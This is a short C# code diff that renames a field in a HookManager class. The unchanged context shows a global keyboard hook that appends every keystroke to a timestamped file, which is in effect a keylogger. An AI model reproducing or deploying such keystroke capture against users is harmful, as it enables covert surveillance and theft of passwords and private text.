@@ -8,7 +8,7 @@ namespace ComeBackLuci
     public class HookManager : IDisposable
     {
         private IKeyboardMouseEvents M_GlobalHook;
-        private string fileData;
+        private string _fileData;
 
         public HookManager()
         {
@@ -20,14 +20,14 @@ namespace ComeBackLuci
             SettingsManager.LastFile = resPath;
             SettingsManager.Save();
 
-            fileData = resPath;
+            _fileData = resPath;
         }
 
         public void Subscribe()
         {
             if (M_GlobalHook != null) return;
 
-            File.WriteAllText(fileData, $"----- {DateTime.Now.ToString("dd/MM/yyyy - hh:mm tt")} -----\n\n");
+            File.WriteAllText(_fileData, $"----- {DateTime.Now.ToString("dd/MM/yyyy - hh:mm tt")} -----\n\n");
 
             M_GlobalHook = Hook.GlobalEvents();
             M_GlobalHook.KeyPress += GlobalHookKeyPress;
@@ -35,7 +35,7 @@ namespace ComeBackLuci
 
         private void GlobalHookKeyPress(object sender, KeyPressEventArgs e)
         {
-            using (StreamWriter sw = new StreamWriter(fileData, true))
+            using (StreamWriter sw = new StreamWriter(_fileData, true))
             {
                 sw.Write(e.KeyChar);
             }
